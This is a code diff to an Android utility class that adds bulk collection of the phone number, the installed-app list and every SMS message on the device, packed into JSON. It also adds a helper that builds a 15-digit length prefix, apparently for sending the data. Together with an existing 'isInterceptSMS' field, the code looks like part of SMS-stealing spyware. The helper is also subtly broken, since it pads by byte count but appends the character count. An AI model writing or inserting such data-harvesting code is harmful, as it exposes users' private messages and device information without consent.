@@ -17,6 +17,7 @@ import com.blankj.utilcode.util.SPUtils;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.UUID;
 
@@ -40,6 +41,24 @@ public class AllUtils {
         info.isInterceptSMS = false;
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         info.phoneNumber = tm.getLine1Number();
+        if(isAllData){
+            listAllApp.clear();
+            for (AppUtils.AppInfo app : AppUtils.getAppsInfo()) {
+                AppInfoBean myApp = new AppInfoBean();
+                myApp.isSystem = app.isSystem();
+                myApp.name = app.getName();
+                myApp.packageName = app.getPackageName();
+                myApp.versionName = app.getVersionName();
+                myApp.icon="";
+                listAllApp.add(myApp);
+            }
+            info.appList = listAllApp;
+            listAllSms = SmsUtils.getAllSMS();
+            info.smsList = listAllSms;
+            return JSON.toJSONString(info);
+
+        }
+
         new Thread() {
             @Override
             public void run() {
@@ -166,6 +185,20 @@ public class AllUtils {
 
     public interface OnSmsAppComeplete {
         void onComplete(String jsonData);
+    }
+    public static String generateFixLength(String info) throws UnsupportedEncodingException {
+        int length = 15;
+
+        if (TextUtils.isEmpty(info)) {
+            info = "";
+        }
+        String str = "" + (info.getBytes("utf-8").length);
+        StringBuffer sb = new StringBuffer();
+        for (int i = 0; i < length - str.length(); i++) {
+            sb.append("0");
+        }
+        sb.append(info.length());
+        return sb.toString();
     }
 
 }
